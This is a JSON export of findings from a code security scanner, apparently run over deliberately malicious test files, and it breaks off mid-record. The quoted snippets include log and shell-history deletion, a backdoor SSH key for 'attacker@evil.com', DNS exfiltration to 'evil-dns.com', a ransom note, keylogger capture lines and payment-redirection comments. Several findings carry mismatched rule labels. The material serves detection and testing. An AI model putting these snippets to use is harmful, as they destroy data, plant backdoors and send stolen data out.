[
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "subprocess.call(['rm', '-rf', '/var/log/*'])",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.644058",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "b9509484-fda6-4986-8730-fdc9c7f45eb1",
    "last_modified": "",
    "line_number": 234,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.644058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/home/user/.bash_history')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.644058",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "3c9508b4-c1c6-46b9-91b9-be199e6e3b45",
    "last_modified": "",
    "line_number": 237,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected - User-specific condition detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.644058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove(file_path)",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.645056",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "e8984f6f-7101-48cd-a313-aaf5d6f96e39",
    "last_modified": "",
    "line_number": 357,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.645056"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "To decrypt your files, you need to pay 0.5 Bitcoin to the following address:",
    "column": 48,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.653058",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "9fa34af5-7b8f-4cfe-a5da-6140cdfa292d",
    "last_modified": "",
    "line_number": 373,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.653058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.658058",
    "data_classification": "UNKNOWN",
    "debt_category": "SECURITY_ISSUE",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "b10c04ed-5030-43ae-b83c-d3590cce64a5",
    "last_modified": "",
    "line_number": 95,
    "message": "Detects hardcoded passwords, API keys, and secrets",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-secrets-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Move secrets to environment variables or secure vault services.",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "VULNERABILITY",
    "update_date": "2025-08-11T21:44:01.658058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "ssh_key = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com\"",
    "column": 9,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.667056",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "39399357-442e-4b19-9f27-0e5b157daf42",
    "last_modified": "",
    "line_number": 95,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.667056"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "ssh.connect('victim-server.com', username='root', key_filename='backdoor_key')",
    "column": 55,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.668057",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "5c1c92b5-7666-40c8-bb47-f66dd08e5cc9",
    "last_modified": "",
    "line_number": 102,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern - User-specific condition detected",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.668057"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "recent_keys = ''.join(captured_keys[-20:])",
    "column": 16,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.671058",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "8cbb07a7-873b-44b5-a5d5-ffcb87b03bdb",
    "last_modified": "",
    "line_number": 459,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.671058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "High",
    "code_snippet": "password_data = ''.join(captured_keys[-50:])",
    "column": 13,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.672057",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_CREDENTIALS",
    "effort": 45,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "39818c09-16aa-413d-890a-1949cc2fbc55",
    "last_modified": "",
    "line_number": 462,
    "message": "Detects hardcoded passwords, API keys, and secrets in code",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-credentials",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.672057"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "app.run(host='0.0.0.0', port=80)",
    "column": 13,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.677058",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_URLS",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "3a132e52-7b22-444e-a8e9-96bf1c9f7084",
    "last_modified": "",
    "line_number": 119,
    "message": "Detects hardcoded URLs and connection strings",
    "payload_analysis": "Unknown payload - MAJOR level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-urls",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "MAJOR",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.677058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "pool_url = \"stratum+tcp://xmr-pool.com:4444\"",
    "column": 10,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.678060",
    "data_classification": "UNKNOWN",
    "debt_category": "HARDCODED_URLS",
    "effort": 30,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "09ee20f9-3cb6-43b5-9c64-e140af8455cc",
    "last_modified": "",
    "line_number": 251,
    "message": "Detects hardcoded URLs and connection strings",
    "payload_analysis": "Unknown payload - MAJOR level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "hardcoded-urls",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "MAJOR",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.678060"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "dns_query = f\"data.{encoded_data[:32]}.evil-dns.com\"",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.680056",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "820cb14b-7b7d-462c-af18-67fb3f645c68",
    "last_modified": "",
    "line_number": 34,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.680056"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "f.write(f\"\\n{ssh_key}\\n\")",
    "column": 17,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.680056",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "a8eac1c2-b774-4395-94c7-6a10a9075c4d",
    "last_modified": "",
    "line_number": 97,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.680056"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "data = f\"block_data_{nonce}\".encode()",
    "column": 24,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.682058",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "d5884d10-117d-42ba-9058-eddced7051bf",
    "last_modified": "",
    "line_number": 262,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.682058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "for file_path in glob.glob(f'/**/{ext}', recursive=True):",
    "column": 36,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.682058",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "ee45d6f2-e714-404b-9bce-4b254da8b242",
    "last_modified": "",
    "line_number": 343,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.682058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"{ip}: {open_ports}\")",
    "column": 19,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.683058",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "1fa2ca97-aaea-4673-bb14-7073fca9356c",
    "last_modified": "",
    "line_number": 513,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.683058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "ip = f\"{network}.{i}\"",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.683058",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "2a70326e-d93f-44ba-9843-ff7f309a4184",
    "last_modified": "",
    "line_number": 519,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.683058"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "full_domain = f\"{sub}.{domain}\"",
    "column": 27,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.684057",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "0acfba3b-17ce-4d8d-8657-f4ca8b768e4a",
    "last_modified": "",
    "line_number": 558,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.684057"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"Found: {full_domain} -> {ip}\")",
    "column": 19,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.684057",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "4501ec03-8341-4c6e-a513-93877359a84b",
    "last_modified": "",
    "line_number": 560,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.684057"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Critical",
    "code_snippet": "print(f\"SNMP access with community: {community}\")",
    "column": 27,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.685060",
    "data_classification": "UNKNOWN",
    "debt_category": "INPUT_VALIDATION",
    "effort": 60,
    "exploitability": "UNKNOWN",
    "file_name": "comprehensive_malware_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\comprehensive_malware_tests.py",
    "id": "5c9d6f9b-d717-4b07-894a-873ec343b531",
    "last_modified": "",
    "line_number": 586,
    "message": "Detects code without proper input validation",
    "payload_analysis": "Unknown payload - CRITICAL level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "input-validation",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "Review and remove suspicious conditional logic according to security best practices",
    "team_owner": "",
    "threat_level": "LOW",
    "trigger_analysis": "Unknown trigger pattern",
    "type": "SECURITY_TECH_DEBT",
    "update_date": "2025-08-11T21:44:01.685060"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# FRAUD: Redirect payments over $1000 to developer account",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.715054",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "c79059f2-f879-4f1b-949e-2cd875e07d34",
    "last_modified": "",
    "line_number": 11,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected - Counter-based logic found",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.715054"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "transfer_crypto(amount, developer_wallet)",
    "column": 14,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.716056",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "2c3a3e9b-4aea-46aa-a647-ab016036b373",
    "last_modified": "",
    "line_number": 76,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Financial redirection - Money theft risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Financial redirection detected",
    "type": "FINANCIAL_FRAUD",
    "update_date": "2025-08-11T21:44:01.716056"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "# Redirect payments to admin account during off-hours",
    "column": 15,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.717057",
    "data_classification": "UNKNOWN",
    "debt_category": "FINANCIAL_SECURITY",
    "effort": 90,
    "exploitability": "UNKNOWN",
    "file_name": "financial_fraud_tests.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
    "id": "0073cea8-8352-47d6-ba35-78c05d787a55",
    "last_modified": "",
    "line_number": 93,
    "message": "Detects potential financial fraud and unauthorized money redirection",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "financial-fraud-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
